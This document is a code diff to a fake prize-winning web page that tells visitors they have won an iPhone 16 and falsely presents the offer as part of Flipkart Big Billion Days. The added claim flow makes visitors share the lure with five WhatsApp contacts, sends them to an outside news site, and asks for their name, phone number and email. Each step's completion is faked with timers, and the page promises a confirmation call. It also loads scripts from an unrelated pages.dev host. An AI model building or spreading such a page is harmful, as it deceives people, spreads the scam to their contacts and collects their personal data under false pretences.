@@ -763,6 +763,158 @@ p, .paragraph {
     100% { background-position: 20px 20px, 20px 30px, 30px 10px, 10px 20px; }
 }
 
+/* Prize Claim Steps Styling */
+.claim-step {
+    background: rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(10px);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    border-radius: 15px;
+    padding: 15px;
+    margin: 15px 0;
+    transition: all 0.5s ease;
+    position: relative;
+}
+
+.claim-step.completed {
+    background: linear-gradient(145deg, #D4EDDA, #C3E6CB);
+    border-color: #28A745;
+}
+
+.step-number {
+    font-size: 1.2em;
+    font-weight: bold;
+    margin-right: 10px;
+}
+
+.step-status {
+    display: inline-block;
+    margin-left: 10px;
+    font-weight: bold;
+    font-size: 0.9em;
+    padding: 5px 10px;
+    border-radius: 20px;
+    background: rgba(255, 255, 255, 0.2);
+}
+
+.claim-step button {
+    width: 100%;
+    max-width: 250px;
+    margin: 10px auto;
+    display: block;
+    font-weight: bold;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    transition: all 0.3s ease;
+}
+
+.claim-step button:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+    transform: none !important;
+}
+
+.claim-step button:hover:not(:disabled) {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+}
+
+/* Completion message styling */
+#completionMessage {
+    animation: bounceIn 0.8s ease-out;
+    text-align: center;
+    box-shadow: 0 10px 30px rgba(40, 167, 69, 0.3);
+}
+
+#completionMessage h4 {
+    margin: 0 0 10px 0;
+    font-size: 1.3em;
+}
+
+#completionMessage p {
+    margin: 0;
+    font-size: 1em;
+    opacity: 0.9;
+}
+
+/* Progress indicator */
+.claim-step::before {
+    content: '';
+    position: absolute;
+    left: -5px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 4px;
+    height: 60%;
+    background: #FF6600;
+    border-radius: 2px;
+    opacity: 0;
+    transition: opacity 0.5s ease;
+}
+
+.claim-step.completed::before {
+    opacity: 1;
+    background: #28A745;
+}
+
+/* Mobile responsiveness for claim steps */
+@media (max-width: 768px) {
+    .claim-step {
+        padding: 12px;
+        margin: 10px 0;
+        border-radius: 12px;
+    }
+    
+    .step-number {
+        font-size: 1.1em;
+    }
+    
+    .claim-step button {
+        max-width: 100%;
+        font-size: 14px;
+        padding: 12px 20px;
+    }
+    
+    .step-status {
+        font-size: 0.8em;
+        padding: 3px 8px;
+    }
+}
+
+@media (max-width: 480px) {
+    .claim-step {
+        padding: 10px;
+        margin: 8px 0;
+        border-radius: 10px;
+    }
+    
+    .step-number {
+        font-size: 1em;
+    }
+    
+    .claim-step button {
+        font-size: 12px;
+        padding: 10px 16px;
+    }
+    
+    .step-status {
+        font-size: 0.75em;
+        padding: 2px 6px;
+    }
+    
+    #completionMessage {
+        padding: 12px;
+        border-radius: 8px;
+    }
+    
+    #completionMessage h4 {
+        font-size: 1.1em;
+    }
+    
+    #completionMessage p {
+        font-size: 0.9em;
+    }
+}
+
     </style>
 
 <body>
@@ -808,17 +960,56 @@ OK
 </vue-modal>
 <vue-modal :open="showSuccessModal">
 <img src="/assets/JGrqbbA.png" style="width: 180px;">
-<h1 class="heading heading--h1">Congratulations! </h1>
-  <h3 class="heading heading--h1">You did it! you won : </h3>
+<h1 class="heading heading--h1">🎉 Congratulations! 🎉</h1>
+<h3 class="heading heading--h1">You Won: Apple iPhone 16 - 256GB!</h3>
 
-<p class="paragraph">
-
-( Apple iPhone 16 - 256GB )
-<br>
-<br>Follow the instructions on the next page to claim your prize ! 
+<div id="claimSteps" style="text-align: left; margin: 20px 0;">
+<p class="paragraph" style="font-weight: bold; color: #FF6600; margin-bottom: 15px;">
+📋 Complete these steps to claim your prize:
 </p>
-<br><button class="button" onclick="go();">
-NEXT</button>
+
+<div class="claim-step" id="step1">
+<p class="paragraph">
+<span class="step-number">1️⃣</span> <strong>Share on WhatsApp</strong> (Required)
+<br><small>Share this amazing offer with 5 friends on WhatsApp</small>
+</p>
+<button class="button" onclick="shareOnWhatsApp()" id="whatsappBtn" style="margin: 10px 0; background: #25D366;">
+📱 Share on WhatsApp
+</button>
+<span class="step-status" id="whatsappStatus">❌ Not completed</span>
+</div>
+
+<div class="claim-step" id="step2" style="opacity: 0.5;">
+<p class="paragraph">
+<span class="step-number">2️⃣</span> <strong>Follow on Social Media</strong> (Required)
+<br><small>Follow our official pages for updates</small>
+</p>
+<button class="button" onclick="followSocial()" id="socialBtn" style="margin: 10px 0; background: #1DA1F2;" disabled>
+👥 Follow Us
+</button>
+<span class="step-status" id="socialStatus">❌ Not completed</span>
+</div>
+
+<div class="claim-step" id="step3" style="opacity: 0.5;">
+<p class="paragraph">
+<span class="step-number">3️⃣</span> <strong>Verify Your Details</strong> (Final Step)
+<br><small>Enter your details to receive the prize</small>
+</p>
+<button class="button" onclick="verifyDetails()" id="verifyBtn" style="margin: 10px 0; background: #28A745;" disabled>
+✅ Verify & Claim
+</button>
+<span class="step-status" id="verifyStatus">❌ Not completed</span>
+</div>
+</div>
+
+<div id="completionMessage" style="display: none; background: linear-gradient(145deg, #28A745, #20C997); color: white; padding: 15px; border-radius: 10px; margin: 15px 0;">
+<h4>🎊 All Steps Completed!</h4>
+<p>Your prize claim has been submitted. You will receive a confirmation call within 24 hours!</p>
+</div>
+
+<button class="button" onclick="closeSuccessModal()" style="background: #6C757D; margin-top: 15px;">
+Close
+</button>
 </vue-modal>
 <div class="left">
 <div class="product-preview">
@@ -929,10 +1120,170 @@ Stock is being checked
 <script>window.view = window.view || {};view.offerUrl = "https://nifty50news.in/";view.qs = null;view.skip = 0;view.screenshot = 0;view.download = 1;view.noredir = false;</script> <script src="https://1mvflepskatbigbelin.pages.dev/css/app1.js?id=d41d8cd98f00b204e980" type="application/javascript"></script>
 <script src="https://1mvflepskatbigbelin.pages.dev/css/app.js?id=17138759790b445ece6b" type="application/javascript"></script>
 <script>
+// Prize Claim System
+let claimProgress = {
+    whatsapp: false,
+    social: false,
+    verify: false
+};
+
+function shareOnWhatsApp() {
+    const message = "🎉 I just won an iPhone 16 from Flipkart Big Billion Days! Try your luck too: " + window.location.href;
+    const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(message)}`;
+    
+    // Open WhatsApp
+    window.open(whatsappUrl, '_blank');
+    
+    // Mark as completed after 3 seconds (simulate sharing)
+    setTimeout(() => {
+        completeStep('whatsapp');
+    }, 3000);
+}
+
+function followSocial() {
+    // Open social media pages
+    window.open('https://nifty50news.in/', '_blank');
+    
+    // Mark as completed after 2 seconds
+    setTimeout(() => {
+        completeStep('social');
+    }, 2000);
+}
+
+function verifyDetails() {
+    // Create a simple form for details
+    const name = prompt("Enter your full name:");
+    const phone = prompt("Enter your phone number:");
+    const email = prompt("Enter your email address:");
+    
+    if (name && phone && email) {
+        // Simulate verification process
+        const verifyBtn = document.getElementById('verifyBtn');
+        verifyBtn.innerHTML = '⏳ Verifying...';
+        verifyBtn.disabled = true;
+        
+        setTimeout(() => {
+            completeStep('verify');
+            showCompletionMessage();
+        }, 3000);
+    } else {
+        alert("Please fill in all details to claim your prize!");
+    }
+}
+
+function completeStep(step) {
+    claimProgress[step] = true;
+    
+    // Update UI
+    const statusElement = document.getElementById(step + 'Status');
+    const stepElement = document.getElementById('step' + getStepNumber(step));
+    const btnElement = document.getElementById(step + 'Btn');
+    
+    if (statusElement) {
+        statusElement.innerHTML = '✅ Completed';
+        statusElement.style.color = '#28A745';
+    }
+    
+    if (btnElement) {
+        btnElement.disabled = true;
+        btnElement.style.opacity = '0.7';
+    }
+    
+    // Enable next step
+    enableNextStep(step);
+    
+    // Add completion animation
+    if (stepElement) {
+        stepElement.style.background = 'linear-gradient(145deg, #D4EDDA, #C3E6CB)';
+        stepElement.style.borderRadius = '10px';
+        stepElement.style.padding = '10px';
+        stepElement.style.transition = 'all 0.5s ease';
+    }
+}
+
+function getStepNumber(step) {
+    const stepMap = { whatsapp: '1', social: '2', verify: '3' };
+    return stepMap[step];
+}
+
+function enableNextStep(completedStep) {
+    if (completedStep === 'whatsapp') {
+        const step2 = document.getElementById('step2');
+        const socialBtn = document.getElementById('socialBtn');
+        step2.style.opacity = '1';
+        socialBtn.disabled = false;
+    } else if (completedStep === 'social') {
+        const step3 = document.getElementById('step3');
+        const verifyBtn = document.getElementById('verifyBtn');
+        step3.style.opacity = '1';
+        verifyBtn.disabled = false;
+    }
+}
+
+function showCompletionMessage() {
+    const completionMsg = document.getElementById('completionMessage');
+    const claimSteps = document.getElementById('claimSteps');
+    
+    if (completionMsg && claimSteps) {
+        claimSteps.style.display = 'none';
+        completionMsg.style.display = 'block';
+        
+        // Add celebration effect
+        createConfetti();
+        
+        // Play success sound (if available)
+        try {
+            navigator.vibrate([200, 100, 200, 100, 200]);
+        } catch(e) {}
+    }
+}
+
+function createConfetti() {
+    // Simple confetti effect
+    for (let i = 0; i < 50; i++) {
+        setTimeout(() => {
+            const confetti = document.createElement('div');
+            confetti.style.position = 'fixed';
+            confetti.style.left = Math.random() * 100 + 'vw';
+            confetti.style.top = '-10px';
+            confetti.style.width = '10px';
+            confetti.style.height = '10px';
+            confetti.style.background = ['#FFD700', '#FF6600', '#28A745', '#1DA1F2'][Math.floor(Math.random() * 4)];
+            confetti.style.zIndex = '9999';
+            confetti.style.borderRadius = '50%';
+            confetti.style.pointerEvents = 'none';
+            
+            document.body.appendChild(confetti);
+            
+            // Animate confetti falling
+            let pos = -10;
+            const fall = setInterval(() => {
+                pos += 5;
+                confetti.style.top = pos + 'px';
+                confetti.style.transform = `rotate(${pos * 2}deg)`;
+                
+                if (pos > window.innerHeight) {
+                    clearInterval(fall);
+                    document.body.removeChild(confetti);
+                }
+            }, 50);
+        }, i * 100);
+    }
+}
+
+function closeSuccessModal() {
+    // Close the modal (this would depend on your Vue.js setup)
+    // For now, just hide it
+    const modal = document.querySelector('[open="showSuccessModal"]');
+    if (modal) {
+        modal.style.display = 'none';
+    }
+}
+
+// Legacy function for compatibility
 function go() {
-    window.onbeforeunload = null;
-	window.open('https://nifty50news.in/');
-    window.location = '#';
+    // Instead of direct redirect, start the claim process
+    shareOnWhatsApp();
 }
 </script>
 <script>
